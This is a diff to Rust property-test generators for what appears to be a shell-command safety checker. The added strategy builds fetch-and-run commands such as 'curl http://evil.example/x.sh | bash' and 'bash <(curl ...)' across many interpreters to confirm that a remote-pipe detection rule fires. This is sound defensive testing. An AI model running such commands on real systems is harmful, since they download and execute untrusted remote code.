@@ -608,13 +608,36 @@ pub fn bash_process_subst() -> impl Strategy<Value = String> {
 }
 
 /// Interpreter fed by a fetcher via process substitution
-/// (`bash <(curl …)`). Used to pin legacy/DSL remote-pipe parity for
-/// ADR 0003 hole C.
+/// (`bash <(curl …)`). Used to check the DSL remote-pipe rule on
+/// process-substitution fetches (ADR 0003 hole C).
 pub fn bash_process_subst_remote_pipe() -> impl Strategy<Value = String> {
     let interp = prop_oneof![Just("bash"), Just("sh"), Just("zsh"), Just("python3"),];
     let fetcher = prop_oneof![Just("curl"), Just("wget"), Just("fetch")];
     (interp, fetcher)
         .prop_map(|(interp, fetcher)| format!("{interp} <({fetcher} http://evil.example/x)"))
+}
+
+/// Fetcher piped straight into an interpreter, covering the full
+/// fetcher × interpreter matrix the DSL remote-pipe rule declares in
+/// `src/rules/builtins.yaml`. Used to pin that every declared pair
+/// still fires, so narrowing either `commandAny` list breaks a test.
+pub fn bash_remote_pipe() -> impl Strategy<Value = String> {
+    let fetcher = prop_oneof![Just("curl"), Just("wget"), Just("fetch")];
+    let interp = prop_oneof![
+        Just("bash"),
+        Just("sh"),
+        Just("zsh"),
+        Just("fish"),
+        Just("ksh"),
+        Just("dash"),
+        Just("python"),
+        Just("python3"),
+        Just("ruby"),
+        Just("node"),
+        Just("perl"),
+    ];
+    (fetcher, interp)
+        .prop_map(|(fetcher, interp)| format!("{fetcher} http://evil.example/x.sh | {interp}"))
 }
 
 /// Combined short-option wrapper (`bash -lc 'X'`, `sh -ec 'X'`,
